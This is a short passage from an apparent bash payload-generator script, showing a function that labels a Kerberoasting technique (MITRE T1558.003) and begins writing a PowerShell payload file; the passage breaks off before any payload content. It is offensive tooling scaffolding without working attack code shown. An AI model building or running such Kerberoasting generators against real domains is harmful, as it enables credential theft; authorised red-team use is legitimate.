# ──────────────────────────────────────────────
gen_kerberoast() {
    echo -e "${CYAN}[*] T1558.003 — Kerberoasting (Domain User Required)${NC}"

    local OUTFILE="${PAYLOAD_DIR}/win_kerberoast.ps1"
    cat > "$OUTFILE" << 'PSEOF'
